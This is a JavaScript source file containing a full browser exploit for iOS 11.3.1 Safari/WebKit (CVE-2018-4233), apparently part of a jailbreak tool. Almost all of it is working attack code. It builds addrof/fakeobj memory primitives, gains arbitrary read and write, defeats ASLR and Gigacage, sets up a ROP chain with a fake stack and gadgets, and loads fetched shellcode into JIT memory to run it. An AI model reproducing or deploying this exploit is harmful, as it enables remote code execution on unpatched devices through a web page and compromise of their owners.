/***
 *     ██╗ ██╗    ██████╗                ██╗ ██╗   ██████╗    ██╗
 *    ███║███║   ██╔═████╗              ███║███║   ╚════██╗  ███║
 *    ╚██║╚██║   ██║██╔██║    █████╗    ╚██║╚██║    █████╔╝  ╚██║
 *     ██║ ██║   ████╔╝██║    ╚════╝     ██║ ██║    ╚═══██╗   ██║
 *     ██║ ██║██╗╚██████╔╝               ██║ ██║██╗██████╔╝██╗██║
 *     ╚═╝ ╚═╝╚═╝ ╚═════╝                ╚═╝ ╚═╝╚═╝╚═════╝ ╚═╝╚═╝
 *		By Niklas B. from phoenhex
 *      Bug used: CVE-2018-4233 by Saelo
 */
using('liblogging');
using('libaddressspace');
using('libc');

print = alert;

var memdump_addr = 0;
var dyld_shared_cache_base = 0x180000000;

var UNITY = {};
UNITY.TEN = 10;
UNITY.HUNDRED = UNITY.TEN * UNITY.TEN;
UNITY.THOUSAND = UNITY.HUNDRED * UNITY.HUNDRED;
UNITY.MILLION = UNITY.THOUSAND * UNITY.THOUSAND;
UNITY.BILLION = UNITY.MILLION * UNITY.MILLION;
UNITY.KB = 1024;
UNITY.MB = UNITY.KB * UNITY.KB;
UNITY.GB = UNITY.MB * UNITY.MB;
UNITY.TB = UNITY.GB * UNITY.GB;

var CONFIG = {};
CONFIG.INTEGRITY_CHECKS_ENABLED = confirm("Enable integrity checks?");
CONFIG.MEMORYDUMP_ENABLED = confirm("Enable memory dump?");
CONFIG.USE_ELECTRA = confirm("Use Electra to jailbreak (not possible yet)? ");
verbosity = prompt("verbosity level: ", VERBOSITY.DEFAULT);
CONFIG.MAX_SHELLCODE_SIZE = 0x1000000;
CONFIG.MEMDUMP_SIZE = 0;

var ITERS = UNITY.TEN * UNITY.THOUSAND;
var ALLOCS = UNITY.THOUSAND;


counter = 0;
_off = {};

var conversion_buffer = new ArrayBuffer(8);
var f64 = new Float64Array(conversion_buffer);
var i32 = new Uint32Array(conversion_buffer);
var BASE32 = 0x100000000;
var workbuf = new ArrayBuffer(0x1000000)
var u32_buffer = new Uint32Array(workbuf);
var u8_buffer = new Uint8Array(workbuf);
var shellcode_length = 0;
var FPO = typeof(SharedArrayBuffer) === 'undefined' ? 0x18 : 0x10;

function f2i(f) {
    f64[0] = f;
    return i32[0] + BASE32 * i32[1];
}

function i2f(i) {
    i32[0] = i % BASE32;
    i32[1] = i / BASE32;
    return f64[0];
}

function b2hex(x) {
    return x < 0 ?  `-${b2hex(-x)}` : `0x${x.toString(16)}`;
}

function hex(b) {
    return ('0' + b.toString(16)).substr(-2);
}

function hexlify(bytes) {
    var res = [];
    for (var i = 0; i < bytes.length; i++)
        res.push(hex(bytes[i]));

    return res.join('');
}

function unhexlify(hexstr) {
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");

    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i < hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

    return bytes;
}


function hex2a(hexx) {
    var hex = hexx.toString();//force conversion
    var str = '';
    for (var i = 0; (i < hex.length && hex.substr(i, 2) !== '00'); i += 2)
        str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
    return str;
}

function memdump(size, addr, readfunc){
   return vm_read64(addr, size, readfunc);
}

function hexdump(data) {
    if (typeof data.BYTES_PER_ELEMENT !== 'undefined')
        data = Array.from(data);

    var lines = [];
    for (var i = 0; i < data.length; i += 16) {
        var chunk = data.slice(i, i+16);
        var parts = chunk.map(hex);
        if (parts.length > 8)
            parts.splice(8, 0, ' ');
        lines.push(parts.join(' '));
    }
    
    return lines.join('\n');
}


function xor(a, b) {
    var res = 0, base = 1;
    for(var i = 0; i < 64; ++i) {
        res += base * ((a&1) ^(b&1));
        a = (a-(a&1))/2;
        b = (b-(b&1))/2;
        base *= 2;
    }
    return res;
}

var Struct = (function() {
    var buffer      = new ArrayBuffer(8);
    var byteView    = new Uint8Array(buffer);
    var uint32View  = new Uint32Array(buffer);
    var float64View = new Float64Array(buffer);

    return {
        pack: function(type, value) {
            var view = type;        // See below
            view[0] = value;
            return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
        },

        unpack: function(type, bytes) {
            if (bytes.length !== type.BYTES_PER_ELEMENT)
                throw Error("Invalid bytearray");

            var view = type;        // See below
            byteView.set(bytes);
            return view[0];
        },

        // Available types.
        int8:    byteView,
        int32:   uint32View,
        float64: float64View
    };
})();


//function called for exploit failure notification
function fail(x) {
    if(x == 3)
        x = "I still need to update the exploit for older devices";
    throw new Error('Exploit failed: ' + x)
}

// CVE-2018-4233
function trigger(constr, modify, res, val) {
    return eval(`
    var o = [13.37]
    var Constructor${counter} = function(o) { ${constr} }
    var hack = false
    var Wrapper = new Proxy(Constructor${counter}, {
        get: function() {
            if (hack) {
                ${modify}
            }
        }
    })
    for (var i = 0; i < ITERS; ++i)
        new Wrapper(o)
    hack = true
    var bar = new Wrapper(o)
    ${res}
    `);
}


//The exploit
var pwn = function() {
    if(CONFIG.MEMORYDUMP_ENABLED) {
        CONFIG.MEMDUMP_SIZE = parseInt(prompt("Enter size of memory dump", 10));
    }
    if(CONFIG.USE_ELECTRA) {
        print('Electra cannot be used to jailbreak your device via safari yet, continueing with rootlessJB.');
    }
    _off = window.chosendevice.offsets;
    console.log('Starting stage 1...');
    
    var stage1 = {
        addrof: function(victim) {
            return f2i(trigger('this.result = o[0]', 'o[0] = val', 'bar.result', victim));
        },
        
        fakeobj: function(addr) {
            return trigger('o[0] = val', 'o[0] = {}', 'o[0]', i2f(addr));
        },
        
        test: function() {
            var addr = this.addrof({a: 0x1337});
            var x = this.fakeobj(addr);
            if (x.a != 0x1337) {
                fail(1);
            }
        }
    };
    
    stage1.test();
   
    var structure_spray = [];
    for (var i = 0; i < 1000; ++i) {
        var ary = {a:1,b:2,c:3,d:4,e:5,f:6,g:0xfffffff};
        ary['prop'+i] = 1;
        structure_spray.push(ary);
    }
    var manager = structure_spray[500];
    var leak_addr = stage1.addrof(manager);
    
    if(verbosity === VERBOSITY.HIGH) print('leaking from '+b2hex(leak_addr));

    function alloc_above_manager(expr) {
        var res
        do {
            for (var i = 0; i < ALLOCS; ++i) {
                structure_spray.push(eval(expr));
            }
            res = eval(expr);
        } while (stage1.addrof(res) < leak_addr)
        return res;
    }
    
    var unboxed_size = 100;
    var unboxed = alloc_above_manager('[' + '13.37,'.repeat(unboxed_size) + ']'); //array with double
    var boxed = alloc_above_manager('[{}]'); //array with object
    var victim = alloc_above_manager('[]'); //array

    victim.p0 = 0x1337; //first padding
    
    function victim_write(val) {
        victim.p0 = val;
    }
    
    function victim_read() {
        return victim.p0;
    }
    
    i32[0] = 0x200;                // Structure ID
    i32[1] = 0x01082007 - 0x10000; // Fake JSCell metadata, adjusted for boxing
    var outer = {
        p0: 0, // Padding, so that the rest of inline properties are 16-byte aligned
        p1: f64[0],
        p2: manager,
        p3: 0xfffffff, // Butterfly indexing mask
    };
    
    var fake_addr = stage1.addrof(outer) +FPO+0x8;
    
    if(verbosity >= VERBOSITY.HIGH) print('fake object is at ' + b2hex(fake_addr));
    
    var unboxed_addr = stage1.addrof(unboxed);
    var boxed_addr = stage1.addrof(boxed);
    var victim_addr = stage1.addrof(victim);
    
    if(verbosity >= VERBOSITY.HIGH) {
        print(''        
            + 'leak '       + b2hex(leak_addr)
            + '\nunboxed '  + b2hex(unboxed_addr)
            + '\nboxed '    + b2hex(boxed_addr)
            + '\nvictim '   + b2hex(victim_addr)
        );
    }

    var holder = {fake: {}};
    holder.fake = stage1.fakeobj(fake_addr);
    

    var shared_butterfly = f2i(holder.fake[(unboxed_addr + 8 - leak_addr) / 8]);
    var boxed_butterfly = holder.fake[(boxed_addr + 8 - leak_addr) / 8];
    holder.fake[(boxed_addr + 8 - leak_addr) / 8] = i2f(shared_butterfly);
    
    var victim_butterfly = holder.fake[(victim_addr + 8 - leak_addr) / 8];
    
    function set_victim_addr(where) {
        holder.fake[(victim_addr + 8 - leak_addr) / 8] = i2f(where + 0x10);
    }
    
    function reset_victim_addr() {
        holder.fake[(victim_addr + 8 - leak_addr) / 8] = victim_butterfly;
    }
    
    print('Stage (1/2) done.');

    var stage2 = {
        addrof: function(victim) {
            boxed[0] = victim;
            return f2i(unboxed[0]);
        },

        fakeobj: function(addr) {
            unboxed[0] = i2f(addr);
            return boxed[0];
        },

        write64: function(where, what) {
            set_victim_addr(where);
            victim_write(this.fakeobj(what));
            reset_victim_addr();
        },

        read64: function(where) {
            set_victim_addr(where);
            var res = this.addrof(victim_read());
            reset_victim_addr();
            return res;
        },

        writeInt64: function(where, what) {
            set_victim_addr(where);
            victim_write(this.fakeobj(f2i(what.asDouble())));
            reset_victim_addr();
        },

        readInt64: function(where) {
            set_victim_addr(where);
            var res = this.addrof(victim_read());
            reset_victim_addr();
            return new Int64(res);
        },

        read: function(addr, length) {
            var a = new Array(length);
            var i = 0;

            for (i = 0; i + 8 < length; i += 8) {
                v = this.readInt64(addr + i).bytes();
                for (var j = 0; j < 8; j++) {
                    a[i+j] = v[j];
                }
            }

            v = this.readInt64(addr + i).bytes();
            for (var j = i; j < length; j++) {
                a[j] = v[j - i];
            }

            return a;
        },

        write_non_zero: function(where, values) {
            for (var i = 0; i < values.length; ++i) {
                if (values[i] != 0) {
                    this.write64(where + i*8, values[i]);
                }
            }
        },

        test: function() {
            this.write64(boxed_addr + 0x10, 0xfff); // Overwrite index mask, no biggie
            if (0xfff != this.read64(boxed_addr + 0x10)) {
                fail(2);
            }
        },

        forge: function(values) {
            for (var i = 0; i < values.length; ++i) {
                unboxed[1 + i] = i2f(values[i]);
            }
            return shared_butterfly + 8;
        },

        clear: function() {
            outer = null;
            holder.fake = null;
            for (var i = 0; i < unboxed_size; ++i) {
                boxed[0] = null;
            }
        },
    };

    stage2.test();


    if(verbosity === VERBOSITY.VERBOSE) {
        print("Stage 2 test succeeded, continueing...");
    }

    var wrapper = document.createElement('div');
    var wrapper_addr = stage2.addrof(wrapper);
    var el_addr = stage2.read64(wrapper_addr + 0x20);
    var vtab_addr = stage2.read64(el_addr);

    if(verbosity >= VERBOSITY.HIGH){
        print("Lets hope our offsets are correct as we will now use them.");
    }

    var slide = stage2.read64(vtab_addr) - _off.vtable;
    var disablePrimitiveGigacage = _off.disableprimitivegigacage + slide;
    var callbacks = _off.callbacks + slide;
    var g_gigacageBasePtrs =  _off.g_gigacagebaseptrs + slide;
    var g_typedArrayPoisons = _off.g_typedarraypoisons + slide;
    var longjmp = _off.longjmp + slide;
    var dlsym = _off.dlsym + slide;

    var testbool = 0;

    var startOfFixedExecutableMemoryPool = stage2.read64(_off.startfixedmempool + slide);
    var endOfFixedExecutableMemoryPool = stage2.read64(_off.endfixedmempool + slide);
    var jitWriteSeparateHeapsFunction = stage2.read64(_off.jit_writeseperateheaps_func + slide);
    var useFastPermisionsJITCopy = stage2.read64(_off.usefastpermissions_jitcopy + slide);

    var ptr_stack_check_guard = _off.ptr_stack_check_guard + slide;
    var pop_x8 = _off.modelio_popx8 + slide;
    var pop_x2 = _off.coreaudio_popx2 + slide;
    var linkcode_gadget = _off.linkcode_gadget + slide;

    print('\nSlide '+b2hex(slide)
        + '\ndisablePrimitiveGigacage @ ' + b2hex(disablePrimitiveGigacage)
        + '\ng_gigacageBasePtrs @ ' + b2hex(g_gigacageBasePtrs)
        + '\ng_typedArrayPoisons @ ' + b2hex(g_typedArrayPoisons)
        + '\nstartOfFixedExecutableMemoryPool @ ' + b2hex(startOfFixedExecutableMemoryPool)
        + '\nendOfFixedExecutableMemoryPool @ ' + b2hex(endOfFixedExecutableMemoryPool)
        + '\njitWriteSeparateHeapsFunction @ ' + b2hex(jitWriteSeparateHeapsFunction)
        + '\nuseFastPermisionsJITCopy @ ' + b2hex(useFastPermisionsJITCopy)
    );

    function legacy_execution() {
        alert('Legacy iPhones (< iPhone 8) can not be jailbroken yet.');
        if(CONFIG.MEMORYDUMP_ENABLED) print('Memory Dump Result: \n'+memorydump(dyld_shared_cache_base + slide, CONFIG.MEMDUMP_SIZE, stage2));
        var callback_vector = stage2.read64(callbacks);
        var poison = stage2.read64(g_typedArrayPoisons + 6*8);
        var buffer_addr = xor(stage2.read64(stage2.addrof(u32_buffer) + 0x18), poison);

        var shellcode_src = buffer_addr + 0x4000;
        var shellcode_dst = endOfFixedExecutableMemoryPool - CONFIG.MAX_SHELLCODE_SIZE;

        if (shellcode_dst < startOfFixedExecutableMemoryPool) {
            fail(4);
        }

        stage2.write64(shellcode_src + 4, dlsym);
                  
        var fake_stack = [
            0,
            shellcode_length,  // x2
            0,
            
            pop_x8,
            
            0, 0, 0, 0, 0,
            shellcode_dst, // x8
            0, 0, 0, 0,
            stage2.read64(ptr_stack_check_guard) + 0x58,
            
            linkcode_gadget,
            0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
            0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
            
            shellcode_dst
        ];
                  
        u32_buffer[0] = longjmp % BASE32;
        u32_buffer[1] = longjmp / BASE32;

        for (var i = 0; i < fake_stack.length; ++i) {
              u32_buffer[0x2000/4 + 2*i] = fake_stack[i] % BASE32;
              u32_buffer[0x2000/4 + 2*i+1] = fake_stack[i] / BASE32;
        }

        stage2.write_non_zero(el_addr, [
            buffer_addr, // fake vtable
            0,
            shellcode_src, // x21
            0, 0, 0, 0, 0, 0, 0,
            0, // fp

            pop_x2, // lr
            0,
            buffer_addr + 0x2000, // sp
        ]);
         if (b2hex(stage2.read64(el_addr + 16)) === b2hex(shellcode_src)) {
            print('shellcode is at: ' + b2hex(shellcode_dst));
        } else {
            fail('Failed writing shellcode');
            return false;
        }
        wrapper.addEventListener('click', function(){});
    }

    function modern_execution() {
        
        var callback_vector = stage2.read64(callbacks);
        var poison = stage2.read64(g_typedArrayPoisons + 6*8);
        var buffer_addr = xor(stage2.read64(stage2.addrof(u32_buffer) + 0x18), poison);

        var shellcode_src = buffer_addr + 0x4000;
        var shellcode_dst = endOfFixedExecutableMemoryPool - CONFIG.MAX_SHELLCODE_SIZE;

        if (shellcode_dst < startOfFixedExecutableMemoryPool) {
            fail(4);
        }

        stage2.write64(shellcode_src + 4, dlsym);
                  
        var fake_stack = [
            0,
            shellcode_length,  // x2
            0,
            
            pop_x8,
            
            0, 0, 0, 0, 0,
            shellcode_dst, // x8
            0, 0, 0, 0,
            stage2.read64(ptr_stack_check_guard) + 0x58,
            
            linkcode_gadget,
            0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
            0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
            
            shellcode_dst
        ];
                  
        u32_buffer[0] = longjmp % BASE32;
        u32_buffer[1] = longjmp / BASE32;

        for (var i = 0; i < fake_stack.length; ++i) {
              u32_buffer[0x2000/4 + 2*i] = fake_stack[i] % BASE32;
              u32_buffer[0x2000/4 + 2*i+1] = fake_stack[i] / BASE32;
        }

        stage2.write_non_zero(el_addr, [
            buffer_addr, // fake vtable
            0,
            shellcode_src, // x21
            0, 0, 0, 0, 0, 0, 0,
            0, // fp

            pop_x2, // lr
            0,
            buffer_addr + 0x2000, // sp
        ]);
        if (b2hex(stage2.read64(el_addr + 16)) === b2hex(shellcode_src)) {
            print('shellcode is at: ' + b2hex(shellcode_dst));
        } else {
            fail('Failed writing shellcode');
            return false;
        }
    }

    if (!useFastPermisionsJITCopy || jitWriteSeparateHeapsFunction) {
        legacy_execution();
    } else {
        modern_execution();
         if(verbosity >= VERBOSITY.DEFAULT) {
            print('EmptyList is started, please close all background apps then dismiss this alert.');    
        }
        wrapper.addEventListener('click', function(){});
    }

   
};


function gethashes(str) {
    return {
        md5: md5(str),
        sha1: Sha1.hash(str),
        sha256: sha512_256(str),
        sha384: sha384(str),
        sha512: sha512(str)
    };
}

function integrity_checks(buffer) {
    if(CONFIG.INTEGRITY_CHECKS_ENABLED) {
        var shellcode_data = new Uint8Array(buffer);
        var shellcode_hashes = gethashes(shellcode_data.join(''));
        
        if(
            shellcode_hashes.md5 !== "ea21cf2e6a39ed1ff842d719ec9f3396" || 
            shellcode_hashes.sha1 !== "162d54f4f9214fb8c8099b48cc97a60543220e1c" ||
            shellcode_hashes.sha256 !== "e00592b23afda7aeb7ee6ec7baf8b2b70d64b1110d26b31921c50003378fdc2b" ||
            shellcode_hashes.sha384 !== "72dd7c0573513c0033cf67d8700ed069644a1f3ff4249b0b271a29047ba3b66b0c66f5d31dc16ed54731fc19300e4a50" ||
            shellcode_hashes.sha512 !== "fb2d3b8509f15a57b72574e5c11b11808b7882cf385a41d49344ca7a0e3910c380e9fe7f72b7a8b717780ccb9e847b0cb55686c56f44688a8876ce56aa8403a0"
        )
        {
            throw new Error('Shellcode integrity check failed.');
        } else {
            print('Shellcode integrity checks passed!');
        }
    }
}


function wk113go() {

    var inline_wk113go = function(buffer) {
        try{
            
            shellcode_length = buffer.byteLength;
            if(shellcode_length > CONFIG.MAX_SHELLCODE_SIZE) {
                fail(5);
            }
            
            integrity_checks(buffer);
            u8_buffer.set(new Uint8Array(buffer), 0x4000);

            if(verbosity >= VERBOSITY.HIGH) { 
                print('Received '+shellcode_length+ ' bytes of shellcode. Exploit will start now.');
                if(!CONFIG.INTEGRITY_CHECKS_ENABLED) {
                    print(
                        JSON.stringify(
                            gethashes(
                                new Uint8Array(buffer).join('')
                            )
                        )
                    );
                }
            }

            return pwn();

        } 
        catch(exception) {
            alert(exception); //We do not want our script to fail, so we catch all exceptions if they occur and continue
        }
    };
    FileStorage.getcontents(FileStorage.mode.FETCH, 'payloads/11_3_1/emptylist_ACK.bin', inline_wk113go);
}
